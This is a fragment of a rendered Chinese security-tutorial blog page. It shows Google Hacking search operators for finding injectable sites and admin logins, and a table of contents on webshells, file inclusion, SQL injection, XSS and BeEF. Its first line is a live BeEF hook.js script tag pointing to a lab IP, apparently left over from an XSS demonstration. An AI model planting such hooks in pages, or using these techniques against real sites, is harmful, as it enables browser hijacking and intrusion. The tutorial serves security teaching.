+<script src="http://192.168.215.129:3000/hook.js"></script>
+
+<p><img src="http://weep.fun/QQ%E6%88%AA%E5%9B%BE20201025155710.png" alt=""></p>
+<p><img src="http://weep.fun/QQ%E6%88%AA%E5%9B%BE20201025155730.png" alt=""></p>
+<h2 id="web信息收集之搜索引擎"><a href="#web信息收集之搜索引擎" class="headerlink" title="web信息收集之搜索引擎"></a>web信息收集之搜索引擎</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.web信息收集(探测)即web踩点,主要是掌握web服务器的方方面面,是实现入侵的准备工作</span><br><span class="line">2.web踩点内容包括操作系统,服务器类型,数据库类型,web容器,web语言,域名信息</span><br><span class="line">3.web信息收集设计搜索引擎,网站扫描,域名遍历,指纹识别</span><br></pre></td></tr></table></figure>
+
+<h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">site: 搜索指定的域名的网页内容,子域名或相关的内容</span><br><span class="line">filetype: 搜索指定文件类型</span><br><span class="line"><span class="code">	pdf	</span></span><br><span class="line">inurl: 搜索url网址存在的特定的关键字的网页,可以搜索有注入点的网站</span><br><span class="line"><span class="code">	php?id=</span></span><br><span class="line">intitle: 搜索标题存在的特定关键词的网页</span><br><span class="line"><span class="code">	后台登陆</span></span><br><span class="line">intext: 搜索正文存在特定的关键词的网页</span><br></pre></td></tr></table></figure>
+
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+          
+        
+          
+            <p>本文永久链接是：<a href=https://www.zfyvip.xyz/2020/10/24/web%E5%AE%89%E5%85%A8%E7%9A%84%E4%BA%86%E8%A7%A3/>https://www.zfyvip.xyz/2020/10/24/web%E5%AE%89%E5%85%A8%E7%9A%84%E4%BA%86%E8%A7%A3/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+    
+    
+
+<section class="widget qrcode  desktop mobile">
+  
+
+  <div class='content article-entry'>
+    
+  </div>
+</section>
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-26T10:29:06+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Oct 26, 2020</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web%E5%AE%89%E5%85%A8/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web安全</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer"
+          
+          href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.zfyvip.xyz/2020/10/24/web%E5%AE%89%E5%85%A8%E7%9A%84%E4%BA%86%E8%A7%A3/&title=web安全的了解 - 东风未起，念你成疾&summary=1.文件上传漏洞 2. 文件包含漏洞 3.sql’注入攻击 4. 跨站脚本攻击 
+
+web引擎收集
+"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer"
+          
+          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://www.zfyvip.xyz/2020/10/24/web%E5%AE%89%E5%85%A8%E7%9A%84%E4%BA%86%E8%A7%A3/&title=web安全的了解 - 东风未起，念你成疾&summary=1.文件上传漏洞 2. 文件包含漏洞 3.sql’注入攻击 4. 跨站脚本攻击 
+
+web引擎收集
+"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer"
+          
+          href="http://service.weibo.com/share/share.php?url=https://www.zfyvip.xyz/2020/10/24/web%E5%AE%89%E5%85%A8%E7%9A%84%E4%BA%86%E8%A7%A3/&title=web安全的了解 - 东风未起，念你成疾&summary=1.文件上传漏洞 2. 文件包含漏洞 3.sql’注入攻击 4. 跨站脚本攻击 
+
+web引擎收集
+"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/10/29/requests%E5%8F%91%E9%80%81https%E8%AF%B7%E6%B1%82-%E5%A4%84%E7%90%86ssl%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>requests发送https请求(处理ssl证书验证)</p>
+                <p class='content'>requests发送https请求(处理ssl证书验证)
+
+
+1、SSL是什么，为什么发送HTTPS请求时需要证书验证？
+12345678910111.1 SSL：安全套接字层。是为了解决HTT...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/10/15/%E8%AE%A9%E5%88%AB%E4%BA%BA%E8%BF%9E%E6%8E%A5%E8%87%AA%E5%B7%B1%E7%9A%84mysql/'>
+                <p class='title'>让别人连接自己的mysql<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>让别人连接自己的mysql
+
+
+修改mysql中mysql databa下的user表
+
+</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      
+      
+      
+      
+      
+        <section id="comments">
+          <div id="valine_container" class="valine_thread">
+            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+          </div>
+        </section>
+      
+      
+        <section id="comments">
+          <div id="minivaline_container">
+            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+          </div>
+        </section>
+      
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: 'web安全的了解',
+      tools: true
+    }
+  </script>
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+  <section class="widget toc-wrapper shadow desktop mobile">
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+    <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传漏洞"><span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实验原理"><span class="toc-text">实验原理:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一句话木马"><span class="toc-text">一句话木马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网页代码一"><span class="toc-text">网页代码一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用菜刀工具进入网站的根目录"><span class="toc-text">使用菜刀工具进入网站的根目录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网页代码二"><span class="toc-text">网页代码二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用神器burpsuit"><span class="toc-text">使用神器burpsuit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网页代码三"><span class="toc-text">网页代码三</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#对上传文件的后缀进行了限制"><span class="toc-text">对上传文件的后缀进行了限制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell的木马程序"><span class="toc-text">webshell的木马程序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#小马-一句话木马-即整个shell代码量只有一行-一般是系统执行函数"><span class="toc-text">小马:一句话木马,即整个shell代码量只有一行,一般是系统执行函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#大马-代码量和功能一样-一般会进行二进制加密-防止防火墙-入侵系统检测"><span class="toc-text">大马:代码量和功能一样,一般会进行二进制加密,防止防火墙&#x2F;入侵系统检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#小马演示"><span class="toc-text">小马演示:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#大马"><span class="toc-text">大马:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#中国菜刀"><span class="toc-text">中国菜刀:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御以及后期处理"><span class="toc-text">防御以及后期处理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含漏洞"><span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-text">原理:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#低安全级别"><span class="toc-text">低安全级别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#本地文件包含-webshell"><span class="toc-text">本地文件包含+webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#远程文件包含-webshell"><span class="toc-text">远程文件包含+webshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#中安全级别"><span class="toc-text">中安全级别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#高安全级别"><span class="toc-text">高安全级别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入攻击"><span class="toc-text">sql注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实验原理-1"><span class="toc-text">实验原理:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于错误的注入"><span class="toc-text">基于错误的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于布尔的注入"><span class="toc-text">基于布尔的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于union注入"><span class="toc-text">基于union注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于时间的盲注"><span class="toc-text">基于时间的盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#information-schema数据库的字典"><span class="toc-text">information_schema数据库的字典</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap自动注入"><span class="toc-text">sqlmap自动注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmqp参数解析"><span class="toc-text">sqlmqp参数解析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#跨站脚本攻击XSS"><span class="toc-text">跨站脚本攻击XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xss简介"><span class="toc-text">xss简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造xss脚本"><span class="toc-text">构造xss脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss反射型"><span class="toc-text">xss反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss存储型"><span class="toc-text">xss存储型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#自动化xss"><span class="toc-text">自动化xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BeEF"><span class="toc-text">BeEF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查看是否开启BeEF"><span class="toc-text">查看是否开启BeEF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web信息收集之搜索引擎"><span class="toc-text">web信息收集之搜索引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Google-Hacking"><span class="toc-text">Google Hacking</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        
+      
+    
+      
+        <br>
+        
+     
+      
+    
+      
+        
+      
+    
+      
+        Use
+        <a href="https://zfyvip.xyz/" target="_blank" class="codename">东风</a>
+        as theme, total visits
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          times
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="https://zfyvip.xyz" target="_blank" rel="noopener">Copyright © 2020-2030 Z.FY</a></p>
+
+        </div>
+      
+    
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?c1bb23d0929b7cf93fb38bd6b8603046";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+Copyright 2018-2020 ZFY'S BLOG 
+<img src="https://cdn.jsdelivr.net/gh/16778738/picture/img/gongan.png">
+<a href="https://beian.miit.gov.cn"  style="color:#f72b07" target="_blank">晋ICP备20005168号</a>
+
+
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("05/22/2020 08:00:00");//在此处修改你的建站时间，格式：月/日/年 时:分:秒
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+  </footer>
+
+<script>setLoadingBarProgress(80);</script>
+
+
+      <script>setLoadingBarProgress(60);</script>
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+
+<!-- 数字雨 -->
+<canvas id="canvas" width="1440" height="900" ></canvas>
+<script type="text/javascript" src="/js/DigitalRain.js"></script>
+
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '8px',
+        duration: '800',
+        interval: '100',
+        scale: '1'
+      });
+    });
+  </script>
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function() {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('') {
+          $('').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js"></script>
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/meting@2.0/dist/Meting.min.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>
+
+  
+  <script>
+  var GUEST_INFO = ['nick','mail','link'];
+  var meta = 'nick,mail,link'.split(',').filter(function(item){
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick','mail','link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function(item){
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+  var valine = new Valine();
+  function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  valine.init({
+    el: '#valine_container',
+    meta: meta,
+    
+    appId: "b14KRSU59Jf9p49rwED1CHQN-gzGzoHsz",
+    appKey: "xpNIURUvFCvRDjcPDGabmVbb",
+    placeholder: "快来评论吧~",
+    pageSize:'10',
+    avatar:'robohash',
+    lang:'zh-cn',
+    visitor: 'true',
+    highlight: 'true',
+    mathJax: 'false',
+    enableQQ: 'true',
+    requiredFields: requiredFields,
+    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
+    emojiMaps: emojiMaps
+  })
+  </script>
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/minivaline@2/dist/MiniValine.min.js"></script>
+
+  
+  
+  
+  
+  
+  <script>
+  new MiniValine({
+	el: '#minivaline_container',
+	appId: 'b14KRSU59Jf9p49rwED1CHQN-gzGzoHsz# your appId',
+	appKey: 'xpNIURUvFCvRDjcPDGabmVbb# your appKey',
+	mode: 'xCss',
+	placeholder: "快来评论吧~",
+	
+	  pathname: location.pathname,
+	
+	lang: '',
+	adminEmailMd5: 'de8a7aa53d07e6b6bceb45c64027763d',
+	tagMeta: ["管理员", "小伙伴", "访客"],
+	master: ["de8a7aa53d07e6b6bceb45c64027763d"],
+	friends: ["b5bd5d836c7a0091aa8473e79ed4c25e", "adb7d1cd192658a55c0ad22a3309cecf", "3ce1e6c77b4910f1871106cb30dc62b0", "cfce8dc43725cc14ffcd9fb4892d5bfc"],
+	math: true,  /*布尔值 字符串无效 下同*/
+	md: true,
+	enableQQ: false,
+	NoRecordIP: false,
+	visitor: true,
+	maxNest: 6,
+	pageSize: 6,
+	emoticonUrl: ["https://cdn.jsdelivr.net/npm/alus@latest", "https://cdn.jsdelivr.net/gh/MiniValine/qq@latest", "https://cdn.jsdelivr.net/gh/MiniValine/Bilibilis@latest", "https://cdn.jsdelivr.net/gh/MiniValine/tieba@latest", "https://cdn.jsdelivr.net/gh/MiniValine/twemoji@latest", "https://cdn.jsdelivr.net/gh/MiniValine/weibo@latest"]
+  });
+  </script>
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-check-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-check-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-times-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-times-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 标准 markdown 描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+
+
+
+  <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
